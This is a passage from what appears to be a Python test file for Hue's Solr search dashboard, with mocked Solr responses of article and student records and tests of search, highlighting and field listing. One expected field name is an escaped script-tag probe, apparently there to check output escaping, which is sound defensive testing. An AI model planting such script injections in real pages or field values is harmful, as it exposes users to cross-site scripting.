""],""article_date"":""2013-06-13T00:00:00Z"",""journal_title"":""Seminars in fetal & neonatal medicine"",""date_created"":""2013-08-22T00:00:00Z"",""journal_country"":""Netherlands"",""journal_iso_abbreviation"":""Semin Fetal Neonatal Med"",""id"":""23680099"",""author"":[""B B Hallberg"",""M M Blennow""],""article_pagination"":""196-201"",""journal_publication_date"":""2013-08-22T00:00:00Z"",""affiliation"":""Department of Neonatology, Karolinska Institutet and University Hospital, Stockholm, Sweden. boubou.hallberg@ki.se"",""language"":""eng"",""_version_"":1450807641462800385},{""article_title"":""Enantiomeric selection properties of -homoDNA: enhanced pairing for heterochiral complexes."",""journal_issn"":""1521-3773"",""article_date"":""2013-06-13T00:00:00Z"",""journal_title"":""Angewandte Chemie (International ed. in English)"",""date_created"":""2013-07-20T00:00:00Z"",""journal_country"":""Germany"",""journal_iso_abbreviation"":""Angew. Chem. Int. Ed. Engl."",""id"":""23670912"",""author"":[""Daniele D D'Alonzo"",""Jussara J Amato"",""Guy G Schepers"",""Matheus M Froeyen"",""Arthur A Van Aerschot"",""Piet P Herdewijn"",""Annalisa A Guaragna""],""article_pagination"":""6662-5"",""journal_publication_date"":""2013-06-24T00:00:00Z"",""affiliation"":""Dipartimento di Scienze Chimiche, Universit degli Studi di Napoli Federico II, Via Cintia 21, 80126 Napoli, Italy. dandalonzo@unina.it"",""language"":""eng"",""_version_"":1450807661929955329},{""article_title"":""Interference of bacterial cell-to-cell communication: a new concept of antimicrobial chemotherapy breaks antibiotic resistance."",""journal_issn"":""1664-302X"",""article_abstract_text"":[""Bacteria use a cell-to-cell communication activity termed \\""quorum sensing\\"" to coordinate group behaviors in a cell density dependent manner. Quorum sensing influences the expression profile of diverse genes, including antibiotic tolerance and virulence determinants, via specific chemical compounds called \\""autoinducers\\"". During quorum sensing, Gram-negative bacteria typically use an acylated homoserine lactone (AHL) called autoinducer 1. Since the first discovery of quorum sensing in a marine bacterium, it has been recognized that more than 100 species possess this mechanism of cell-to-cell communication. In addition to being of interest from a biological standpoint, quorum sensing is a potential target for antimicrobial chemotherapy. This unique concept of antimicrobial control relies on reducing the burden of virulence rather than killing the bacteria. It is believed that this approach will not only suppress the development of antibiotic resistance, but will also improve the treatment of refractory infections triggered by multi-drug resistant pathogens. In this paper, we review and track recent progress in studies on AHL inhibitors/modulators from a biological standpoint. It has been discovered that both natural and synthetic compounds can disrupt quorum sensing by a variety of means, such as jamming signal transduction, inhibition of signal production and break-down and trapping of signal compounds. We also focus on the regulatory elements that attenuate quorum sensing activities and discuss their unique properties. Understanding the biological roles of regulatory elements might be useful in developing inhibitor applications and understanding how quorum sensing is controlled.""],""ontologies"":[""2402|1 "",""1875|1 "",""2047|3 "",""36690|1 "",""8120|1 "",""1872|1 "",""1861|1 "",""1955|2 "",""38027|1 "",""3853|1 "",""2237|3 "",""37074|1 "",""3043|2 "",""36478|1 "",""4403|1 "",""2751|1 "",""10751|1 "",""36467|1 "",""2387|1 "",""7278|3 "",""3826|1 ""],""article_date"":""2013-06-13T00:00:00Z"",""journal_title"":""Frontiers in microbiology"",""date_created"":""2013-06-30T00:00:00Z"",""journal_country"":""Switzerland"",""journal_iso_abbreviation"":""Front Microbiol"",""id"":""23720655"",""author"":[""Hidetada H Hirakawa"",""Haruyoshi H Tomita""],""article_pagination"":""114"",""journal_publication_date"":""2013-09-13T00:00:00Z"",""affiliation"":""Advanced Scientific Research Leaders Development Unit, Gunma University Maebashi, Gunma, Japan."",""language"":""eng"",""_version_"":1450807662055784448},{""article_title"":""The role of musical training in emergent and event-based timing."",""journal_issn"":""1662-5161"",""article_abstract_text"":[""Introduction: Musical performance is thought to rely predominantly on event-based timing involving a clock-like neural process and an explicit internal representation of the time interval. Some aspects of musical performance may rely on emergent timing, which is established through the optimization of movement kinematics, and can be maintained without reference to any explicit representation of the time interval. We predicted that musical training would have its largest effect on event-based timing, supporting the dissociability of these timing processes and the dominance of event-based timing in musical performance. Materials and Methods: We compared 22 musicians and 17 non-musicians on the prototypical event-based timing task of finger tapping and on the typically emergently timed task of circle drawing. For each task, participants first responded in synchrony with a metronome (Paced) and then responded at the same rate without the metronome (Unpaced). Results: Analyses of the Unpaced phase revealed that non-musicians were more variable in their inter-response intervals for finger tapping compared to circle drawing. Musicians did not differ between the two tasks. Between groups, non-musicians were more variable than musicians for tapping but not for drawing. We were able to show that the differences were due to less timer variability in musicians on the tapping task. Correlational analyses of movement jerk and inter-response interval variability revealed a negative association for tapping and a positive association for drawing in non-musicians only. Discussion: These results suggest that musical training affects temporal variability in tapping but not drawing. Additionally, musicians and non-musicians may be employing different movement strategies to maintain accurate timing in the two tasks. These findings add to our understanding of how musical training affects timing and support the dissociability of event-based and emergent timing modes.""],""ontologies"":[""36810|1 "",""49002|1 "",""3132|1 "",""3797|1 "",""37953|1 "",""36563|2 "",""524|1 "",""3781|1 "",""2848|1 "",""17163|1 "",""17165|1 "",""49010|1 "",""36647|3 "",""36529|1 "",""2936|1 "",""2643|1 "",""714|1 "",""3591|1 "",""2272|1 "",""3103|1 "",""2265|1 "",""37051|1 "",""3691|1 ""],""article_date"":""2013-06-14T00:00:00Z"",""journal_title"":""Frontiers in human neuroscience"",""date_created"":""2013-06-29T00:00:00Z"",""journal_country"":""Switzerland"",""journal_iso_abbreviation"":""Front Hum Neurosci"",""id"":""23717275"",""author"":[""L H LH Baer"",""J L N JL Thibodeau"",""T M TM Gralnick"",""K Z H KZ Li"",""V B VB Penhune""],""article_pagination"":""191"",""journal_publication_date"":""2013-09-13T00:00:00Z"",""affiliation"":""Department of Psychology, Centre for Research in Human Development, Concordia University Montral, QC, Canada."",""language"":""eng"",""_version_"":1450807667479019520}]},""facet_counts"":{""facet_queries"":{},""facet_fields"":{""journal_title"":[""in"",4,""frontiers"",2,""angewandte"",1,""chemie"",1,""ed"",1,""english"",1,""fetal"",1,""human"",1,""international"",1,""medicine"",1,""microbiology"",1,""neonatal"",1,""neuroscience"",1,""seminars"",1],""author_facet"":[""Annalisa A Guaragna"",1,""Arthur A Van Aerschot"",1,""B B Hallberg"",1,""Daniele D D'Alonzo"",1,""Guy G Schepers"",1,""Haruyoshi H Tomita"",1,""Hidetada H Hirakawa"",1,""J L N JL Thibodeau"",1,""Jussara J Amato"",1,""K Z H KZ Li"",1,""L H LH Baer"",1,""M M Blennow"",1,""Matheus M Froeyen"",1,""Piet P Herdewijn"",1,""T M TM Gralnick"",1,""V B VB Penhune"",1]},""facet_dates"":{""article_date"":{""gap"":""+1DAYS"",""start"":""2013-04-27T00:00:00Z"",""end"":""2013-06-28T00:00:00Z""}},""facet_ranges"":{}},""highlighting"":{""23680099"":{},""23670912"":{},""23720655"":{},""23717275"":{}},""spellcheck"":{""suggestions"":[""correctlySpelled"",false]}}"""""")

    # journal_title facet + date range article_date facets clicked and author_facet not clicked
    # http://solr:8983/solr/articles/select?user.name=hue&doAs=romain&q=%2A%3A%2A&wt=json&rows=15&start=0&facet=true&facet.mincount=1&facet.limit=100&facet.sort=count&facet.field=journal_title&facet.field=author_facet&facet.date=article_date&f.article_date.facet.date.start=NOW-7MONTH%2FDAYS&f.article_date.facet.date.end=NOW-5MONTH&f.article_date.facet.date.gap=%2B1DAYS&fq=article_date%3A%5B2013-06-13T00%3A00%3A00Z+TO+2013-06-13T00%3A00%3A00Z%2B1DAYS%5D&fq=journal_title%3A%22in%22
    response = self.c.post(reverse('dashboard:search'), {
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'query': json.dumps(QUERY)
    })

    assert_false('alert alert-error' in response.content, response.content)

    assert_true('author_facet' in response.content, response.content)
    assert_true('Annalisa A Guaragna' in response.content, response.content)

    assert_true('journal_title' in response.content, response.content)
    assert_true('Angewandte' in response.content, response.content)

    assert_true('""numFound"": 4' in response.content, response.content)

  def test_response_highlighting_with_binary_value(self):
    MockResource.set_solr_response(""""""{""responseHeader"":{""status"":0,""QTime"":23,""params"":{""hl.fragsize"":""1000"",""fl"":""*"",""hl.snippets"":""5"",""start"":""0"",""user.name"":""hue"",""q"":""*:*"",""doAs"":""romain"",""hl.fl"":""*"",""wt"":""json"",""hl"":""true"",""rows"":""2""}},""response"":{""numFound"":494,""start"":0,""docs"":[{""id"":""#31;#8;w)U#3;333320442#2;#27;v"",""last_name"":""Ogh"",""gpa"":""3.88"",""first_name"":""Eirjish"",""age"":""12"",""_version_"":1508697786597507072},{""id"":""#31;#8;w)U#3;3444574#2;r"",""last_name"":""Ennjth"",""gpa"":""1.22"",""first_name"":""Oopob"",""age"":""14"",""_version_"":1508697786815610880}]},""facet_counts"":{""facet_queries"":{},""facet_fields"":{""id"":[""31"",485,""8"",485,""u"",485,""2"",461,""x"",308,""w"",145,""3"",123,""4"",90,""3;3"",81,""0"",76,""y"",46,""41"",15,""16"",14,""42"",14,""05"",12,""7"",12,""04"",11,""15"",11,""3;31"",11,""44"",11,""45"",11,""i"",11,""n"",11,""s"",11,""03"",10,""07"",10,""11"",10,""28"",10,""30"",10,""3;34"",10,""46"",10,""a"",10,""c"",10,""j"",10,""v"",10,""02"",9,""1"",9,""26"",9,""6"",9,""e"",9,""f"",9,""p"",9,""z"",9,""00"",8,""06"",8,""14"",8,""43"",8,""g"",8,""h"",8,""r"",8,""20"",7,""23"",7,""29"",7,""3;37"",7,""40"",7,""k"",7,""01"",6,""17"",6,""22"",6,""24"",6,""27"",6,""3;35"",6,""3;36"",6,""b"",6,""12"",5,""19"",5,""21"",5,""3;323"",5,""3;33"",5,""47"",5,""5"",5,""o"",5,""18"",4,""25"",4,""2;6"",4,""3;32"",4,""3;360"",4,""3;372"",4,""d"",4,""q"",4,""t"",4,""005"",3,""2;3"",3,""3;311"",3,""3;343"",3,""3;344"",3,""3;373"",3,""420"",3,""471"",3,""9"",3,""l"",3,""m"",3,""0147"",2,""020"",2,""022"",2,""031"",2,""065"",2,""070"",2,""2;0"",2,""2;5"",2],""first_name"":[""unt"",3,""at"",2,""aut"",2,""eigh"",2,""jh"",2,""jir"",2,""jz"",2,""oim"",2,""oith"",2,""onn"",2,""ouz"",2,""um"",2,""veitt"",2,""16"",1,""21"",1,""28"",1,""30"",1,""achunn"",1,""ad"",1,""agauz"",1,""agur"",1,""aibenn"",1,""aich"",1,""aichaum"",1,""aigh"",1,""aim"",1,""aimoob"",1,""ainn"",1,""aipf"",1,""aipfouv"",1,""aisainn"",1,""aistjs"",1,""aith"",1,""aitoum"",1,""aittool"",1,""aittoupf"",1,""aiw"",1,""ak"",1,""al"",1,""apf"",1,""astjist"",1,""ataiv"",1,""att"",1,""auchav"",1,""auchib"",1,""auchih"",1,""aud"",1,""audaush"",1,""auh"",1,""auhour"",1,""aum"",1,""aunnoiss"",1,""aunopf"",1,""aupev"",1,""aus"",1,""ausaust"",1,""austour"",1,""ausyv"",1,""auth"",1,""authep"",1,""auttjich"",1,""auttjir"",1,""av"",1,""besooz"",1,""bjfautt"",1,""bjichaub"",1,""bjittyl"",1,""bjtoopf"",1,""bleiss"",1,""blistoot"",1,""blittaub"",1,""bljip"",1,""bljir"",1,""bloich"",1,""bluhaid"",1,""bluth"",1,""breirjd"",1,""breiter"",1,""breitt"",1,""breth"",1,""brjishaip"",1,""broil"",1,""broopfoul"",1,""brooputt"",1,""brooroog"",1,""brot"",1,""brych"",1,""brykaub"",1,""brypfop"",1,""bunn"",1,""byroigh"",1,""c"",1,""caugh"",1,""cautt"",1,""chaittoif"",1,""chaupour"",1,""chautoonn"",1,""chech"",1,""cheigh"",1,""chet"",1],""last_name"":[""it"",3,""ooz"",3,""yss"",3,""aih"",2,""aim"",2,""ash"",2,""foum"",2,""ig"",2,""jch"",2,""jif"",2,""jis"",2,""jiv"",2,""jiw"",2,""js"",2,""oh"",2,""ouf"",2,""uch"",2,""ud"",2,""uf"",2,""ul"",2,""ush"",2,""ys"",2,""ab"",1,""ach"",1,""afoust"",1,""aghaush"",1,""aib"",1,""aihjiss"",1,""aimoint"",1,""ain"",1,""aineip"",1,""ainn"",1,""aint"",1,""aintuf"",1,""aipfes"",1,""aipfjf"",1,""air"",1,""aish"",1,""aishoott"",1,""aishutt"",1,""aisjnn"",1,""aisseih"",1,""aissutt"",1,""aistaif"",1,""aith"",1,""aithjib"",1,""aiv"",1,""aiw"",1,""aiz"",1,""aizyb"",1,""alyk"",1,""ap"",1,""apf"",1,""apount"",1,""assyv"",1,""ast"",1,""at"",1,""atook"",1,""att"",1,""audal"",1,""aug"",1,""auk"",1,""auloost"",1,""aupfoitt"",1,""aupjish"",1,""aur"",1,""aus"",1,""authood"",1,""auttyst"",1,""auvjb"",1,""auvon"",1,""auzigh"",1,""az"",1,""besh"",1,""birus"",1,""bjit"",1,""bjz"",1,""blaich"",1,""blaipf"",1,""bleiz"",1,""blikjigh"",1,""bloob"",1,""blouth"",1,""boobjist"",1,""boontoih"",1,""boub"",1,""bouch"",1,""braul"",1,""braut"",1,""breinnyz"",1,""brishoog"",1,""brithith"",1,""brjint"",1,""brjth"",1,""brubeist"",1,""brugh"",1,""bryvaip"",1,""byl"",1,""caleid"",1,""ceir"",1],""age"":[""12"",60,""18"",57,""14"",56,""10"",54,""11"",53,""13"",52,""16"",50,""15"",49,""17"",44],""gpa"":[""2.34"",6,""1.01"",5,""1.43"",5,""3.04"",5,""3.14"",5,""3.17"",5,""3.87"",5,""1.61"",4,""2.24"",4,""2.73"",4,""2.76"",4,""2.97"",4,""3.28"",4,""3.29"",4,""3.35"",4,""3.39"",4,""3.67"",4,""3.78"",4,""3.85"",4,""1.05"",3,""1.1"",3,""1.13"",3,""1.22"",3,""1.25"",3,""1.3"",3,""1.34"",3,""1.37"",3,""1.38"",3,""1.39"",3,""1.4"",3,""1.44"",3,""1.46"",3,""1.53"",3,""1.54"",3,""1.55"",3,""1.67"",3,""1.72"",3,""1.82"",3,""1.91"",3,""1.93"",3,""11.0"",3,""2.09"",3,""2.11"",3,""2.23"",3,""2.26"",3,""2.29"",3,""2.46"",3,""2.62"",3,""2.71"",3,""2.78"",3,""2.79"",3,""2.83"",3,""2.84"",3,""2.85"",3,""2.92"",3,""3.09"",3,""3.11"",3,""3.13"",3,""3.23"",3,""3.44"",3,""3.76"",3,""3.82"",3,""3.88"",3,""3.89"",3,""3.92"",3,""3.97"",3,""4.0"",3,""1.02"",2,""1.11"",2,""1.23"",2,""1.26"",2,""1.28"",2,""1.35"",2,""1.48"",2,""1.56"",2,""1.59"",2,""1.63"",2,""1.79"",2,""1.8"",2,""1.81"",2,""1.97"",2,""16.0"",2,""2.01"",2,""2.03"",2,""2.05"",2,""2.08"",2,""2.12"",2,""2.14"",2,""2.17"",2,""2.2"",2,""2.25"",2,""2.3"",2,""2.35"",2,""2.36"",2,""2.41"",2,""2.47"",2,""2.49"",2,""2.51"",2,""2.54"",2,""2.56"",2],""date1"":[],""date2"":[],""country"":[],""state"":[],""city"":[],""latitude"":[],""longitude"":[]},""facet_dates"":{},""facet_ranges"":{},""facet_intervals"":{}},""highlighting"":{""#31;#8;w)U#3;333320442#2;#27;v"":{},""#31;#8;w)U#3;3444574#2;r"":{}}}"""""")

    response = self.c.post(reverse('dashboard:search'), {
        'collection': json.dumps(self._get_collection_param(self.collection)),
        'query': json.dumps(QUERY)
    })

    assert_false('alert alert-error' in response.content, response.content)
    assert_false(""'ascii' codec can't encode character u'\ufffd' in position"" in response.content, response.content)

    assert_true('bluhaid' in response.content, response.content)

  def test_get_collection_fields(self):
    MockResource.set_solr_response(""""""{""responseHeader"":{""status"":0,""QTime"":8},""index"":{""numDocs"":8,""maxDoc"":8,""deletedDocs"":0,""version"":15,""segmentCount"":5,""current"":true,""hasDeletions"":false,""directory"":""org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(org.apache.solr.store.hdfs.HdfsDirectory@5efe087b lockFactory=org.apache.solr.store.hdfs.HdfsLockFactory@5106def2; maxCacheMB=192.0 maxMergeSizeMB=16.0)"",""userData"":{""commitTimeMSec"":""1389233070579""},""lastModified"":""2014-01-09T02:04:30.579Z""},""fields"":{""_version_"":{""type"":""long"",""schema"":""ITS-----OF------"",""index"":""-TS-------------"",""docs"":8,""distinct"":8,""topTerms"":[""1456716393276768256"",1,""1456716398067712000"",1,""1456716401465098240"",1,""1460689159964327936"",1,""1460689159981105152"",1,""1460689159988445184"",1,""1460689159993688064"",1,""1456716273606983680"",1],""histogram"":[""1"",8]},""cat"":{""type"":""string"",""schema"":""I-S-M---OF-----l"",""index"":""ITS-----OF------"",""docs"":4,""distinct"":1,""topTerms"":[""currency"",4],""histogram"":[""1"",0,""2"",0,""4"",1]},""features"":{""type"":""text_general"",""schema"":""ITS-M-----------"",""index"":""ITS-------------"",""docs"":4,""distinct"":3,""topTerms"":[""coins"",4,""notes"",4,""and"",4],""histogram"":[""1"",0,""2"",0,""4"",3]},""id"":{""type"":""string"",""schema"":""I-S-----OF-----l"",""index"":""ITS-----OF------"",""docs"":8,""distinct"":8,""topTerms"":[""GBP"",1,""NOK"",1,""USD"",1,""change.me"",1,""change.me1"",1,""change.me112"",1,""change.me12"",1,""EUR"",1],""histogram"":[""1"",8]},""inStock"":{""type"":""boolean"",""schema"":""I-S-----OF-----l"",""index"":""ITS-----OF------"",""docs"":4,""distinct"":1,""topTerms"":[""true"",4],""histogram"":[""1"",0,""2"",0,""4"",1]},""manu"":{""type"":""text_general"",""schema"":""ITS-----O-------"",""index"":""ITS-----O-------"",""docs"":4,""distinct"":7,""topTerms"":[""of"",2,""bank"",2,""european"",1,""norway"",1,""u.k"",1,""union"",1,""america"",1],""histogram"":[""1"",5,""2"",2]},""manu_exact"":{""type"":""string"",""schema"":""I-------OF-----l"",""index"":""(unstored field)"",""docs"":4,""distinct"":4,""topTerms"":[""Bank of Norway"",1,""European Union"",1,""U.K."",1,""Bank of America"",1],""histogram"":[""1"",4]},""manu_id_s"":{""type"":""string"",""schema"":""I-S-----OF-----l"",""dynamicBase"":""*_s"",""index"":""ITS-----OF------"",""docs"":4,""distinct"":4,""topTerms"":[""eu"",1,""nor"",1,""uk"",1,""boa"",1],""histogram"":[""1"",4]},""name"":{""type"":""text_general"",""schema"":""ITS-------------"",""index"":""ITS-------------"",""docs"":4,""distinct"":6,""topTerms"":[""one"",4,""euro"",1,""krone"",1,""dollar"",1,""pound"",1,""british"",1],""histogram"":[""1"",5,""2"",0,""4"",1]},""price_c"":{""type"":""currency"",""schema"":""I-S------F------"",""dynamicBase"":""*_c""},""price_c____amount_raw"":{""type"":""amount_raw_type_tlong"",""schema"":""IT------O-------"",""dynamicBase"":""*____amount_raw"",""index"":""(unstored field)"",""docs"":4,""distinct"":8,""topTerms"":[""0"",4,""0"",4,""0"",4,""0"",4,""0"",4,""0"",4,""0"",4,""100"",4],""histogram"":[""1"",0,""2"",0,""4"",8]},""price_c____currency"":{""type"":""currency_type_string"",""schema"":""I-------O-------"",""dynamicBase"":""*____currency"",""index"":""(unstored field)"",""docs"":4,""distinct"":4,""topTerms"":[""GBP"",1,""NOK"",1,""USD"",1,""EUR"",1],""histogram"":[""1"",4]},""romain_t"":{""type"":""text_general"",""schema"":""ITS-------------"",""dynamicBase"":""*_t"",""index"":""ITS-------------"",""docs"":1,""distinct"":1,""topTerms"":[""true"",1],""histogram"":[""1"",1]},""text"":{""type"":""text_general"",""schema"":""IT--M-----------"",""index"":""(unstored field)"",""docs"":8,""distinct"":21,""topTerms"":[""and"",4,""currency"",4,""notes"",4,""one"",4,""coins"",4,""bank"",2,""of"",2,""change.me112"",1,""change.me1"",1,""change.me"",1],""histogram"":[""1"",14,""2"",2,""4"",5]},""title"":{""type"":""text_general"",""schema"":""ITS-M-----------"",""index"":""ITS-------------"",""docs"":4,""distinct"":4,""topTerms"":[""change.me1"",1,""change.me112"",1,""change.me12"",1,""change.me"",1],""histogram"":[""1"",4]}},""info"":{""key"":{""I"":""Indexed"",""T"":""Tokenized"",""S"":""Stored"",""D"":""DocValues"",""M"":""Multivalued"",""V"":""TermVector Stored"",""o"":""Store Offset With TermVector"",""p"":""Store Position With TermVector"",""O"":""Omit Norms"",""F"":""Omit Term Frequencies & Positions"",""P"":""Omit Positions"",""H"":""Store Offsets with Positions"",""L"":""Lazy"",""B"":""Binary"",""f"":""Sort Missing First"",""l"":""Sort Missing Last""},""NOTE"":""Document Frequency (df) is not updated when a document is marked for deletion.  df values include deleted documents.""}}"""""")

    assert_equal(
        # Dynamic fields not included for now
        [{'isDynamic': False, 'isId': None, 'type': 'string', 'name': '&lt;script&gt;alert(1234)&lt;/script&gt;'},
         {'isDynamic': False, 'isId': None, 'type': 'long', 'name': '_version_'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'author'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'category'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'comments'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'content'},
         {'isDynamic': False, 'isId': None, 'type': 'string', 'name': 'content_type'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'description'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'features'},
         {'isDynamic': False, 'isId': None, 'type': 'boolean', 'name': 'inStock'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'includes'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'keywords'},
         {'isDynamic': False, 'isId': None, 'type': 'date', 'name': 'last_modified'},
         {'isDynamic': False, 'isId': None, 'type': 'string', 'name': 'links'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'manu'},
         {'isDynamic': False, 'isId': None, 'type': 'string', 'name': 'manu_exact'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'name'},
         {'isDynamic': False, 'isId': None, 'type': 'payloads', 'name': 'payloads'},
         {'isDynamic': False, 'isId': None, 'type': 'int', 'name': 'popularity'},
         {'isDynamic': False, 'isId': None, 'type': 'float', 'name': 'price'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'resourcename'},
         {'isDynamic': False, 'isId': None, 'type': 'text_en_splitting_tight', 'name': 'sku'},
         {'isDynamic': False, 'isId': None, 'type': 'location', 'name': 'store'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'subject'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'text'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general_rev', 'name': 'text_rev'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'title'},
         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'url'},
         {'isDynamic': False, 'isId': None, 'type': 'float', 'name': 'weight'},
         {'isDynamic': False, 'isId': True, 'type': 'string', 'name': 'id'}],
         self.collection.fields_data(self.user, 'collection_1')
    )

  # TODO
  # test facet with userlocation: trkiye, , new york

  def test_download(self):
    MockResource.set_solr_response(""""""{""responseHeader"":{""status"":0,""QTime"":59,""params"":{""facet"":""true"",""facet.mincount"":""1"",""facet.limit"":""100"",""facet.date"":""article_date"",""f.article_date.facet.date.start"":""NOW-7MONTH/DAYS"",""wt"":""json"",""rows"":""15"",""user.name"":""hue"",""start"":""0"",""facet.sort"":""count"",""q"":""*:*"",""f.article_date.facet.date.end"":""NOW-5MONTH"",""doAs"":""romain"",""f.article_date.facet.date.gap"":""+1DAYS"",""facet.field"":[""journal_title"",""author_facet""],""fq"":[""article_date:[2013-06-13T00:00:00Z TO 2013-06-13T00:00:00Z+1DAYS]"",""journal_title:\\""in\\""""]}},""response"":{""numFound"":4,""start"":0,""maxScore"":1.0,""docs"":[{""article_title"":""Investigations for neonatal seizures."",""journal_issn"":""1878-0946"",""article_abstract_text"":[""Seizures during the neonatal period are always medical emergencies. Apart from the need for rapid anticonvulsive treatment, the underlying condition is often not immediately obvious. In the search for the correct diagnosis, a thorough history, clinical examination, laboratory work-up, neurophysiological and neuroradiological investigations are all essential. A close collaboration between neonatologists, neuropaediatricians, laboratory specialists, neurophysiologists and radiologists facilitates the adequate care of the infant.""],""ontologies"":[""36481|1 ""],""article_date"":""2013-06-13T00:00:00Z"",""journal_title"":""Seminars in fetal & neonatal medicine"",""date_created"":""2013-08-22T00:00:00Z"",""journal_country"":""Netherlands"",""journal_iso_abbreviation"":""Semin Fetal Neonatal Med"",""id"":""23680099"",""author"":[""B B Hallberg"",""M M Blennow""],""article_pagination"":""196-201"",""journal_publication_date"":""2013-08-22T00:00:00Z"",""affiliation"":""Department of Neonatology, Karolinska Institutet and University Hospital, Stockholm, Sweden. boubou.hallberg@ki.se"",""language"":""eng"",""_version_"":1450807641462800385},{""article_title"":""Enantiomeric selection properties of -homoDNA: enhanced pairing for heterochiral complexes."",""journal_issn"":""1521-3773"",""article_date"":""2013-06-13T00:00:00Z"",""journal_title"":""Angewandte Chemie (International ed. in English)"",""date_created"":""2013-07-20T00:00:00Z"",""journal_country"":""Germany"",""journal_iso_abbreviation"":""Angew. Chem. Int. Ed. Engl."",""id"":""23670912"",""author"":[""Daniele D D'Alonzo"",""Jussara J Amato"",""Guy G Schepers"",""Matheus M Froeyen"",""Arthur A Van Aerschot"",""Piet P Herdewijn"",""Annalisa A Guaragna""],""article_pagination"":""6662-5"",""journal_publication_date"":""2013-06-24T00:00:00Z"",""affiliation"":""Dipartimento di Scienze Chimiche, Universit degli Studi di Napoli Federico II, Via Cintia 21, 80126 Napoli, Italy. dandalonzo@unina.it"",""language"":""eng"",""_version_"":1450807661929955329},{""article_title"":""Interference of bacterial cell-to-cell communication: a new concept of antimicrobial chemotherapy breaks antibiotic resistance."",""journal_issn"":""1664-302X"",""article_abstract_text"":[""Bacteria use a cell-to-cell communication activity termed \\""quorum sensing\\"" to coordinate group behaviors in a cell density dependent manner. Quorum sensing influences the expression profile of diverse genes, including antibiotic tolerance and virulence determinants, via specific chemical compounds called \\""autoinducers\\"". During quorum sensing, Gram-negative bacteria typically use an acylated homoserine lactone (AHL) called autoinducer 1. Since the first discovery of quorum sensing in a marine bacterium, it has been recognized that more than 100 species possess this mechanism of cell-to-cell communication. In addition to being of interest from a biological standpoint, quorum sensing is a potential target for antimicrobial chemotherapy. This unique concept of antimicrobial control relies on reducing the burden of virulence rather than killing the bacteria. It is believed that this approach will not only suppress the development of antibiotic resistance, but will also improve the treatment of refractory infections triggered by multi-drug resistant pathogens. In this paper, we review and track recent progress in studies on AHL inhibitors/modulators from a biological standpoint. It has been discovered that both natural and synthetic compounds can disrupt quorum sensing by a variety of means, such as jamming signal transduction, inhibition of signal production and break-down and trapping of signal compounds. We also focus on the regulatory elements that attenuate quorum sensing activities and discuss their unique properties. Understanding the biological roles of regulatory elements might be useful in developing inhibitor applications and understanding how quorum sensing is controlled.""],""ontologies"":[""2402|1 "",""1875|1 "",""2047|3 "",""36690|1 "",""8120|1 "",""1872|1 "",""1861|1 "",""1955|2 "",""38027|1 "",""3853|1 "",""2237|3 "",""37074|1 "",""3043|2 "",""36478|1 "",""4403|1 "",""2751|1 "",""10751|1 "",""36467|1 "",""2387|1 "",""7278|3 "",""3826|1 ""],""article_date"":""2013-06-13T00:00:00Z"",""journal_title"":""Frontiers in microbiology"",""date_created"":""2013-06-30T00:00:00Z"",""journal_country"":""Switzerland"",""journal_iso_abbreviation"":""Front Microbiol"",""id"":""23720655"",""author"":[""Hidetada H Hirakawa"",""Haruyoshi H Tomita""],""article_pagination"":""114"",""journal_publication_date"":""2013-09-13T00:00:00Z"",""affiliation"":""Advanced Scientific Research Leaders Development Unit, Gunma University Maebashi, Gunma, Japan."",""language"":""eng"",""_version_"":1450807662055784448},{""article_title"":""The role of musical training in emergent and event-based timing."",""journal_issn"":""1662-5161"",""article_abstract_text"":[""Introduction: Musical performance is thought to rely predominantly on event-based timing involving a clock-like neural process and an explicit internal representation of the time interval. Some aspects of musical performance may rely on emergent timing, which is established through the optimization of movement kinematics, and can be maintained without reference to any explicit representation of the time interval. We predicted that musical training would have its largest effect on event-based timing, supporting the dissociability of these timing processes and the dominance of event-based timing in musical performance. Materials and Methods: We compared 22 musicians and 17 non-musicians on the prototypical event-based timing task of finger tapping and on the typically emergently timed task of circle drawing. For each task, participants first responded in synchrony with a metronome (Paced) and then responded at the same rate without the metronome (Unpaced). Results: Analyses of the Unpaced phase revealed that non-musicians were more variable in their inter-response intervals for finger tapping compared to circle drawing. Musicians did not differ between the two tasks. Between groups, non-musicians were more variable than musicians for tapping but not for drawing. We were able to show that the differences were due to less timer variability in musicians on the tapping task. Correlational analyses of movement jerk and inter-response interval variability revealed a negative association for tapping and a positive association for drawing in non-musicians only. Discussion: These results suggest that musical training affects temporal variability in tapping but not drawing. Additionally, musicians and non-musicians may be employing different movement strategies to maintain accurate timing in the two tasks. These findings add to our understanding of how musical training affects timing and support the dissociability of event-based and emergent timing modes.""],""ontologies"":[""36810|1 "",""49002|1 "",""3132|1 "",""3797|1 "",""37953|1 "",""36563|2 "",""524|1 "",""3781|1 "",""2848|1 "",""17163|1 "",""17165|1 "",""49010|1 "",""36647|3 "",""36529|1 "",""2936|1 "",""2643|1 "",""714|1 "",""3591|1 "",""2272|1 "",""3103|1 "",""2265|1 "",""37051|1 "",""3691|1 ""],""article_date"":""2013-06-14T00:00:00Z"",""journal_title"":""Frontiers in human neuroscience"",""date_created"":""2013-06-29T00:00:00Z"",""journal_country"":""Switzerland"",""journal_iso_abbreviation"":""Front Hum Neurosci"",""id"":""23717275"",""author"":[""L H LH Baer"",""J L N JL Thibodeau"",""T M TM Gralnick"",""K Z H KZ Li"",""V B VB Penhune""],""article_pagination"":""191"",""journal_publication_date"":""2013-09-13T00:00:00Z"",""affiliation"":""Department of Psychology, Centre for Research in Human Development, Concordia University Montral, QC, 